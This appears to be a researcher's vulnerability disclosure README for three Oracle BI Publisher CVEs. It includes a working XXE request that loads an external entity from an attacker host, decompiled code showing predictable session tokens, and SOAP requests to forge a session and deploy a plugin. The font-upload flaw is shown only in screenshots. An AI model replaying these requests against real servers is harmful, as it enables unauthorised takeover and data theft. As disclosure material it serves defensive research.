# Oracle-BI-bugs

## CVE-2019-2767
 * Subject: XXE IN CONVERT SERVLET
 * CVSSv3.0 Base Score: 7.2
 * CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
 
```
GET /xmlpserver/convert?xml=<%3fxml+version%3d"1.0"+%3f><!DOCTYPE+r+[<!ELEMENT+r+ANY+><!ENTITY+%25+sp+SYSTEM+"http%3a//ehost%3a1337/ev.xml">%25sp%3b%25param1%3b]>&_xf=Excel&_xl=123&template=123 HTTP/1.1
Host: host
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflat
Connection: close
Upgrade-Insecure-Requests: 1
```

## CVE-2019-2768
 * Subject: ACCESS TO ADMIN SERVICES, SESSION GENERATION ERROR
 * CVSSv3.0 Base Score: 7.5
 * CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
 
Oracle BI has xmlpserver which uses an administrator to configure the server. To use xmlpserver services, the administrator needs to create a session using createSession function.
```
POST /xmlpserver/services/XMLPService HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.204.179:9502/xmlpserver/services
Connection: close
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 192.168.204.179:9502
Content-Length: 610

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:rep="http://xmlns.oracle.com/oxp/service/report">
   <soapenv:Header/>
   <soapenv:Body>
      <rep:createSession soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <username xsi:type="xsd:string">weblogic</username>
         <password xsi:type="xsd:string">asdQWE123</password>
         <domain xsi:type="xsd:string">bi</domain>
      </rep:createSession>
   </soapenv:Body>
</soapenv:Envelope>

```
I tried to generate a session a few time and I got the same value in the response. I changed the password and but again I got 

```
<createSessionReturn xsi:type="xsd:string">-1626402211</createSessionReturn>
```
![session](https://github.com/vah13/Oracle-BI-bugs/blob/master/img/sess1.jpg)

```java
private String createCallerSession(final XDOPrincipal user, final String domain) {
        Logger.log("XMLPService.createCallerSession...if here things are looking ok", 1);
        final String token = tokenize(domain, user.getName());
        final XDOPrincipal principal = TokenHolder.getPrincipal(token);
        if (principal == null) {
            final XDOPrincipal guser = (XDOPrincipal)GlobalUser.get();
            TokenHolder.addPrincipal(token, guser);
        }
        return token;
    }
    
    private static String tokenize(final String domain, final String username) {
        final StringBuffer sb = new StringBuffer();
        if (domain != null) {
            sb.append(domain);
        }
        sb.append(':').append(username);
        final int key = sb.toString().hashCode();
        return new Integer(key).toString();
    }
```
WHAT? Is the session consists of two public datas (username and server ID)? I tried to write a simple code here what I got
![web](https://github.com/vah13/Oracle-BI-bugs/blob/master/img/hash.png)


Example of plugin deploy request
```
POST /xmlpserver/services/v2/PluginService HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.204.179:9502/xmlpserver/services
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 192.168.204.179:9502
Content-Length: 431

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:v2="http://xmlns.oracle.com/oxp/service/v2">
   <soapenv:Header/>
   <soapenv:Body>
      <v2:deploy>
         <v2:sessionToken>-1626402211</v2:sessionToken>
         <v2:appPath>0</v2:appPath>
         <v2:pluginName>1</v2:pluginName>
         <v2:uploadedData>2</v2:uploadedData>
      </v2:deploy>
   </soapenv:Body>
</soapenv:Envelope>
```
so, as a result, you can take control of a server if you know 2 public data of server.


## CVE-2019-2771
 * Subject: BIP BYPASS FONT UPLOAD
 * CVSSv3.0 Base Score: 8.2
 * CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:H/A:L
 
![web](https://github.com/vah13/Oracle-BI-bugs/blob/master/img/f1.png)

![upload](https://github.com/vah13/Oracle-BI-bugs/blob/master/img/f2.png)

![write file](https://github.com/vah13/Oracle-BI-bugs/blob/master/img/f3.png)

![file on the system](https://github.com/vah13/Oracle-BI-bugs/blob/master/img/f4.png)
